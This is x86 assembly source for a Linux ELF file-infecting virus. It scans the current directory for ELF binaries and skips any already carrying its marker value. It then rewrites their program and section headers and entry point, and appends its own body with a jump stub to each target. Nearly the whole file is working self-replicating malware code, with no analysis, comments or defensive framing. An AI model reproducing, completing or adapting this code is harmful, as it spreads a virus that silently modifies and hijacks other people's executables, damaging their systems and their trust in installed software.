section .text
    global v_start
v_start:
    mov ecx, 2328
    push 0x00
    sub ecx, 1
    cmp ecx, 0
    jbe loop_bss
    mov edi, esp
    call folder
    db ".", 0
folder:
    pop ebx
    mov esi, 0
    mov eax, 5
    mov ecx, 0
    mov edx, 0
    int 80h
    cmp eax, 0
    jbe v_stop
    mov ebx, eax
    mov eax, 0xdc
    mov ecx, edi
    add ecx, 32
    mov edx, 1024
    int 80h
    mov eax, 6
    int 80h
    xor ebx, ebx
find_filename_start:
    inc ebx
    cmp ebx, 1024
    jge infect
    cmp byte [edi+32+ebx], 0x00
    jnz find_filename_start
    inc ebx
    cmp byte [edi+32+ebx], 0x08
    jnz find_filename_start
    xor ecx, ecx
    mov byte [edi+ecx], 0x2e
    inc ecx
    mov byte [edi+ecx], 0x2f
    inc ecx
find_filename_end:
    inc ebx
    cmp ebx, 1024
    jge infect
    push esi
    mov esi, edi
    add esi, 32
    add esi, ebx
    push edi
    add edi, ecx
    movsb
    pop edi
    pop esi
    inc ecx
    cmp byte [edi+32+ebx], 0x00
    jnz find_filename_end
    mov byte [edi+ecx], 0x00
    push ebx
    call scan_file
    pop ebx
    jmp find_filename_start
scan_file:
    mov eax, 5
    mov ebx, edi
    mov ecx, 0
    int 80h
    cmp eax, 0
    jbe return
    mov ebx, eax
    mov eax, 3
    mov ecx, edi
    add ecx, 2080
    mov edx, 12
    int 80h
    call elfheader
    dd 0x464c457f
elfheader:
    pop ecx
    mov ecx, dword [ecx]
    cmp dword [edi+2080], ecx
    jnz close_file
    mov ecx, 0x001edd0e
    cmp dword [edi+2080+8], ecx
    jz close_file
save_target:
    push esi
    push edi
    mov ecx, edi
    add edi, 1056
    add edi, esi
    mov esi, ecx
    mov ecx, 32
    rep movsb
    pop edi
    pop esi
    add esi, 32
close_file:
    mov eax, 6
    int 80h
return:
    ret
infect:
    cmp esi, 0
    jbe v_stop
    sub esi, 32
    mov eax, 5
    mov ebx, edi
    add ebx, 1056
    add ebx, esi
    mov ecx, 2
    int 80h
    mov ebx, eax
    mov ecx, edi
    add ecx, 2080
reading_loop:
    mov eax, 3
    mov edx, 1
    int 80h
    cmp eax, 0
    je reading_eof
    mov eax, edi
    add eax, 9312
    cmp ecx, eax
    jge infect
    add ecx, 1
    jmp reading_loop
reading_eof:
    push ecx
    mov eax, 6
    int 80h
    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+44]
    mov eax, dword [edi+2080+28]
    sub ax, word [edi+2080+42]
program_header_loop:
    add ax, word [edi+2080+42]
    cmp ecx, 0
    jbe infect
    sub ecx, 1
    mov ebx, dword [edi+2080+eax]
    cmp ebx, 0x01
    jne program_header_loop
    mov ebx, dword [edi+2080+eax+4]
    cmp ebx, 0x00
    je program_header_loop
    mov ebx, dword [edi+2080+24]
    push ebx
    mov ebx, dword [edi+2080+eax+4]
    mov edx, dword [edi+2080+eax+16]
    add ebx, edx
    push ebx
    mov ebx, dword [edi+2080+eax+8]
    add ebx, edx
    mov ecx, 0x001edd0e
    mov [edi+2080+8], ecx
    mov [edi+2080+24], ebx
    add edx, v_stop - v_start
    add edx, 7
    mov [edi+2080+eax+16], edx
    mov ebx, dword [edi+2080+eax+20]
    add ebx, v_stop - v_start
    add ebx, 7
    mov [edi+2080+eax+20], ebx
    xor ecx, ecx
    xor eax, eax
    mov cx, word [edi+2080+48]
    mov eax, dword [edi+2080+32]
    sub ax, word [edi+2080+46]
section_header_loop:
    add ax, word [edi+2080+46]
    cmp ecx, 0
    jbe finish_infection
    sub ecx, 1
    mov ebx, dword [edi+2080+eax+4]
    cmp ebx, 0x00000008
    jne section_header_loop
    mov ebx, dword [edi+2080+eax+12]
    add ebx, v_stop - v_start
    add ebx, 7
    mov [edi+2080+eax+12], ebx
section_header_loop_2:
    mov edx, dword [edi+2080+eax+16]
    add edx, v_stop - v_start
    add edx, 7
    mov [edi+2080+eax+16], edx
    add eax, 40
    sub ecx, 1
    cmp ecx, 0
    jg section_header_loop_2
finish_infection:
    ;dword [edi+2080+24]
    ;dword [edi+2080+28]
    ;dword [edi+2080+32]
    ;word [edi+2080+40]
    ;word [edi+2080+42]
    ;word [edi+2080+44]
    ;word [edi+2080+46]
    ;word [edi+2080+48]
    mov eax, v_stop - v_start
    add eax, 7
    mov ebx, dword [edi+2080+32]
    add eax, ebx
    mov [edi+2080+32], eax
    mov eax, 5
    mov ebx, edi
    add ebx, 1056
    add ebx, esi
    mov ecx, 2
    int 80h
    mov ebx, eax
    mov eax, 4
    mov ecx, edi
    add ecx, 2080
    pop edx
    int 80h
    mov [edi+7], edx
    call delta_offset
delta_offset:
    pop ebp
    sub ebp, delta_offset
    mov eax, 4
    lea ecx, [ebp + v_start]
    mov edx, v_stop - v_start
    int 80h
    pop edx
    mov [edi], byte 0xb8
    mov [edi+1], edx
    mov [edi+5], word 0xe0ff
    mov eax, 4
    mov ecx, edi
    mov edx, 7
    int 80h
    mov eax, 4
    mov ecx, edi
    add ecx, 2080
    mov edx, dword [edi+7]
    add ecx, edx
    pop edx
    sub edx, ecx
    int 80h
    mov eax, 36
    int 80h
    mov eax, 6
    int 80h
    jmp infect
v_stop:
    mov eax, 1
    mov ebx, 0
    int 80h